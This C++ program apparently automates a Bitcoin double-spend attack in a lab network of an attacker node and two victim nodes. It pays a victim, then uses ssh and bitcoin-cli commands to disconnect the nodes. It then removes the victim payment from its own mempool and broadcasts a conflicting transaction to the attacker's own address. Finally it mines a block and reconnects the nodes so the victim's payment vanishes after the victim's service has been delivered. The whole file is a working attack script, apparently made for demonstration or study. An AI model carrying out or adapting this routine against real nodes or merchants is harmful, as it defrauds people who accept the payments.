#include <cstdlib>
#include <cstdio>

#include "CParameterPreparator.h"
#include "CSynchronizationGuard.h"
#include "CTransactionHandler.h"

/**
 * Save the specified address into attackers' filesystem.
 */
void saveGeneratedAttackerAddress(const std::string &attackerAddress) {
    //The attackers' address is suppossed to receive ((the full ammount of bitcoins in selected UTXO) - fee [0.11]) in case of successfull attack. -> We want to save it into our filesystem, so it can be further used.
    std::filesystem::directory_iterator addressIt("/home/attacker/attacker/addresses");
    int addressCount = std::count_if(begin(addressIt), end(addressIt),
                                     [](const auto &entry) { return entry.is_regular_file(); });
    std::ostringstream fileName;
    fileName << "/home/attacker/attacker/addresses/address_" << addressCount << ".txt";
    std::ofstream addressFile(fileName.str());
    addressFile << attackerAddress;
}

int main() {
    //Perform a synchronization check.
    if (system("~/attacks/scripts/checkSynchronization.sh")) {
        std::cerr << rang::fg::red << rang::style::bold << "------------------NETWORK ERROR------------------"
                  << std::endl
                  << "One or more of the expected nodes is not running/synchronized. Please try waiting for a short while and rerunning the program. If the problem persists, consider reseting the network. "
                  << rang::style::reset << std::endl;
        return 1;
    }

    //Check whether a usable address exists within the system. If not, generate one.
    if (std::filesystem::is_empty("/home/attacker/attacker/addresses")) {
        std::cout << rang::fg::gray << rang::style::bold << "No usable addresses exist, generating new address."
                  << rang::style::reset << std::endl;
        system("bitcoin-cli getnewaddress > ~/attacker/addresses/address_0.txt");
    }

    //Create helper objects.
    CSynchronizationGuard synchronizationGuard;
    CParameterPreparator parameterPreparator;
    CTransactionHandler transactionHandler;

    //Select the UTXO to be used in the attack.
    transactionInfo UTXO = parameterPreparator.chooseUTXO();

    //Generate addresses (except for the one with the UTXO, that is pre-defined) in format <victimAddress, attackerAddress2>.
    std::pair<std::string, std::string> addresses = parameterPreparator.generateAddresses("bitcoin-cli getnewaddress",
                                                                                          "ssh victim1@$IP_VICTIM1 'bitcoin-cli getnewaddress'");
    saveGeneratedAttackerAddress(addresses.first);

    //Calculate ammounts "paid" to the victim node.
    std::pair<float, float> paidAmmounts = parameterPreparator.calculateAmmounts(UTXO, 0.11);

    //Create transactions using the same UTXOs, but to different addresses.
    std::ostringstream txVictimOss, txAttackerOss;
    //Standard transaction to the victim.
    txVictimOss << "bitcoin-cli createrawtransaction \'[{\"txid\": \"" << UTXO.m_txID << "\",\"vout\":" << UTXO.m_vout
                << "}]\' \'{\"" << addresses.second << "\":" << paidAmmounts.first << ", \"" << UTXO.m_address << "\":"
                << paidAmmounts.second;
    //Transaction simply sends [UTXO.amount-fee] to attackers other address.
    //Fee on the second transaction has to be higher due to RBF policy: https://buybitcoinworldwide.com/rbf/
    txAttackerOss << "bitcoin-cli createrawtransaction \'[{\"txid\": \"" << UTXO.m_txID << "\",\"vout\":" << UTXO.m_vout
                  << "}]\' \'{\"" << addresses.first << "\":" << paidAmmounts.first + paidAmmounts.second - 0.01;

    //Generate and sign both transactions. Keep signed hexes as structure <victimTx, attackerTx>
    std::pair<std::string, std::string> signedTransactionHexes = transactionHandler.createSignedTransactions(
            txVictimOss, txAttackerOss);

    //Send the victim transaction to the VICTIM1 and save the txid of the created transaction.
    std::string txidVictimSent = transactionHandler.sendTransaction(signedTransactionHexes.first);
    synchronizationGuard.waitForTxDelivery("ssh victim1@$IP_VICTIM1 'bitcoin-cli listtransactions'", txidVictimSent);
    std::cout << rang::style::bold << rang::fg::gray << "The transaction to victim with txid [" << txidVictimSent
              << "] has been sent." << rang::style::reset << std::endl;

    //Disconnect all nodes in the network.
    system("bitcoin-cli addnode $IP_VICTIM1:18445 remove; bitcoin-cli disconnectnode $IP_VICTIM1:18445");
    system("bitcoin-cli addnode $IP_VICTIM2:18445 remove; bitcoin-cli disconnectnode $IP_VICTIM2:18445");
    system("ssh victim1@$IP_VICTIM1 \"bitcoin-cli addnode $IP_ATTACKER:18445 remove | bitcoin-cli disconnectnode $IP_ATTACKER:18445\"");
    system("ssh victim1@$IP_VICTIM1 \"bitcoin-cli addnode $IP_VICTIM2:18445 remove | bitcoin-cli disconnectnode $IP_VICTIM2:18445\"");
    system("ssh victim2@$IP_VICTIM2 \"bitcoin-cli addnode $IP_ATTACKER:18445 remove | bitcoin-cli disconnectnode $IP_ATTACKER:18445\"");
    system("ssh victim2@$IP_VICTIM2 \"bitcoin-cli addnode $IP_VICTIM1:18445 remove | bitcoin-cli disconnectnode $IP_VICTIM1:18445\"");
    synchronizationGuard.waitForDisconnection(0, 0, 0);

    //Delete the transaction to the victim from attackers' mempool.
    transactionHandler.deleteTransaction(txidVictimSent);

    //Send the attacker transaction (effectively just to attacker - all nodes are disconnected) and save the txid of the created transaction.
    std::string txidAttackerSent = transactionHandler.sendTransaction(signedTransactionHexes.second);
    synchronizationGuard.waitForTxDelivery("bitcoin-cli listtransactions", txidAttackerSent);
    std::cout << rang::style::bold << rang::fg::gray << "The transaction to attackers second account with txid ["
              << txidAttackerSent << "] has been sent." << rang::style::reset << std::endl;

    //Print the transactions to show success of the attack.
    std::cout << rang::style::bold << rang::fg::gray
              << "Both nodes have transactions spending the same output in their mempools:" << rang::style::reset
              << std::endl;
    transactionHandler.printTransactions("----------------------ATTACKER----------------------",
                                         "-----------------------VICTIM------------------------",
                                         "bitcoin-cli listtransactions \"*\" 200",
                                         "ssh victim1@$IP_VICTIM1 \"bitcoin-cli listtransactions \'*\' 200\"",
                                         txidAttackerSent, txidVictimSent);

    //Mine one block. -> Attacker premined block.
    std::cout << rang::style::bold << rang::fg::gray << "Attacker is mining a block! -> Transaction with txid ["
              << txidAttackerSent << "] should persist." << rang::style::reset << std::endl;
    redi::ipstream mine("bitcoin-cli -generate 1 &> /dev/null", redi::pstreams::pstdout);

    //Delete any previously received services. Ipstreams' only purpose is to silence possible errors.
    redi::ipstream del("rm -r /home/attacker/attacker/victim1/serviceVictim1.txt",
                       redi::pstreams::pstdout | redi::pstreams::pstderr);

    //Issue calls to victim to run their returnService.sh script simmulating a deamon running on them that sends some kind of service for received payments.
    system("ssh victim1@$IP_VICTIM1 \"./scripts/returnService.sh\"");

    //Connect all nodes back together.
    system("bitcoin-cli addnode $IP_VICTIM1:18445 add");
    system("bitcoin-cli addnode $IP_VICTIM2:18445 add");
    system("ssh victim1@$IP_VICTIM1 \"bitcoin-cli addnode $IP_ATTACKER:18445 add\"");
    system("ssh victim1@$IP_VICTIM1 \"bitcoin-cli addnode $IP_VICTIM2:18445 add\"");
    system("ssh victim2@$IP_VICTIM2 \"bitcoin-cli addnode $IP_ATTACKER:18445 add\"");
    system("ssh victim2@$IP_VICTIM2 \"bitcoin-cli addnode $IP_VICTIM1:18445 add\"");

    //Wait for all nodes to connect back.
    while (system("~/attacks/scripts/checkSynchronization.sh")) {
        sleep(DELAY_SEC);
    }

    //Print the transactions to show success of the attack.
    std::cout << rang::style::bold << rang::fg::gray << "Transaction issued to victim should no longer exist:"
              << rang::style::reset << std::endl;
    transactionHandler.printTransactions("----------------------ATTACKER----------------------",
                                         "-----------------------VICTIM------------------------",
                                         "bitcoin-cli listtransactions \"*\" 200",
                                         "ssh victim1@$IP_VICTIM1 \"bitcoin-cli listtransactions \'*\' 200\"",
                                         txidAttackerSent, txidVictimSent);
    //Report attack success/failure.
    if (std::filesystem::exists("/home/attacker/attacker/victim1/serviceVictim1.txt")) {
        std::cout << rang::fg::green << rang::style::bold << "Attack was successful, service was correctly received:"
                  << rang::style::reset << std::endl;
        std::cout << rang::style::bold << rang::fg::magenta << "-----------------------VICTIM------------------------"
                  << rang::style::reset << std::endl;
        system("cat ~/attacker/victim1/serviceVictim1.txt");
        std::cout << rang::style::bold << rang::fg::gray << "-----------------------------------------------------"
                  << rang::style::reset << std::endl;
        std::cout << rang::fg::green << rang::style::bold
                  << "The received service is the file: '~/attacker/victim1/serviceVictim1.txt'" << rang::style::reset
                  << std::endl;
    } else {
        std::cout << rang::fg::red << rang::style::bold << "Attack unssuccessful, the service was not received!"
                  << std::endl << "You can check '~/attacker/victim1/serviceVictim1.txt' to debug what happend."
                  << std::endl << "If this was not the expected output, consider reseting the network."
                  << rang::style::reset << std::endl;
    }

    return 0;
}
